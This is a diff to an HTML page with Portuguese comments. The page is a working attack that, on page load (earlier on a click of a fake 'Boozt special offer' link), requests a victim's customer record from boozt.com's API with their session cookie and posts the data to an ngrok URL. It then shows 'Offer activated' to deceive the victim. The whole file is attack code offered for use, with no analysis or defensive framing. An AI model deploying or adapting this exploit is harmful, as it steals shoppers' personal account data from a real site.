@@ -1,27 +1,27 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <a href="#" id="maliciousLink">Clique aqui para uma oferta especial da Boozt!</a>
     <script>
-        document.getElementById("maliciousLink").addEventListener("click", function(e) {
-            e.preventDefault(); // Evita redirecionamento
-            fetch("https://www.boozt.com/de/de/api/customer", {
-                method: "GET", // Teste GET primeiro; se não funcionar, tente PATCH
-                credentials: "include", // Envia o PHPSESSID
-                headers: {
-                    "X-Requested-With": "XMLHttpRequest"
-                }
+        fetch("https://www.boozt.com/de/de/api/customer", {
+            method: "GET", // Usando GET para simplicidade; pode mudar para PATCH se necessário
+            credentials: "include", // Envia o PHPSESSID
+            headers: {
+                "X-Requested-With": "XMLHttpRequest"
+            }
+        })
+        .then(response => response.json())
+        .then(data => {
+            // Envia os dados diretamente para o ngrok
+            fetch("https://54b7-2804-4580-1080-7db-e5f3-62e8-de0e-c67e.ngrok-free.app/capture", {
+                method: "POST",
+                body: JSON.stringify(data)
             })
-            .then(response => response.json())
-            .then(data => {
-                // Envia os dados sensíveis para o ngrok
-                fetch("https://54b7-2804-4580-1080-7db-e5f3-62e8-de0e-c67e.ngrok-free.app/capture", {
-                    method: "POST",
-                    body: JSON.stringify(data)
-                });
-                alert("Oferta ativada!"); // Engana a vítima
-            })
-            .catch(error => console.error("Erro:", error));
+            .then(() => {
+                document.body.innerHTML = "Oferta ativada! Dados enviados com sucesso.";
+            });
+        })
+        .catch(error => {
+            document.body.innerHTML = "Erro: " + error.message;
         });
     </script>
 </body>
